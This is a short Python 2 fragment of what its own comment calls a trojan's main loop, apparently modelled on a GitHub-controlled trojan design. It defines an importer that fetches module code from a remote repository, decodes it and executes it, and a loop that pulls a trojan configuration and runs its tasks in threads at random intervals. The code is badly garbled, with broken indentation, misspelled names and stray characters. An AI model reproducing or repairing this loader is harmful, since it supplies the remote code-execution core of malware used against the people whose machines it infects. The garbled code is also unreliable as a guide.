class GitImpoter(object):
  def_init_(self):
   self.current_module_code=""
       def find_module(self,fullname,path=None):
	     if configured:
		  print"[*] Attempting to retrieve %s" %fullname
		      new_library=get_file_contents("modules/%s" %fullname)
			  if new_library is not None:
			      self.current_module_code=base.becode(new_library)
                        return self 
                         return None
    
	def load_module(self,name):
                            module=imp.new_module(name)
                        exec self.current_module_code in  module._dict_
     sys.module[name]=module
                                             return module	 
 def  module_runner(module):
		 task_queue.put(1)
		 result=sys.module[module].run()
		   task_queue.get()
		   store_module_result(result)
		    return
			#木马的主循环
		sys.meta_path=[GitImpoter()]
		while True；
		   if  task_queue.empty():
		     config  =get_trojan_config()
          for  task in config:
                 t=threading.Thread(target=module_runner,args=(task['module'],))
                t.start()
                  time.sleep(random.randint(1,10))
          time.sleep(random.randint(1000,10000))				  
		
		
		
		
		
		
		
		
		
		]